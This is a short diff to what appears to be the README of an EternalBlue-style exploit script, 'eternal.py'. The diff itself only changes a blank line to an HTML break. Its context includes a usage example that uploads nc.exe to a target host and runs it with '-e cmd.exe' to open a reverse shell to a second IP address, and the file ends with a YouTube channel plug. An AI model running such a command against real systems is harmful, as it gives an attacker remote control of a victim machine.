@@ -14,6 +14,6 @@ usage:
 
 example: `python3 eternal.py -i 10.10.10.40 -t nc.exe -o nc.exe -c 'c:/nc.exe 10.10.15.8 4455 -e cmd.exe'`
 
-
+<br>
 
 If this exploit was usefull to you remember to subscribe to my youtube channel -> https://www.youtube.com/@artes_oscuras
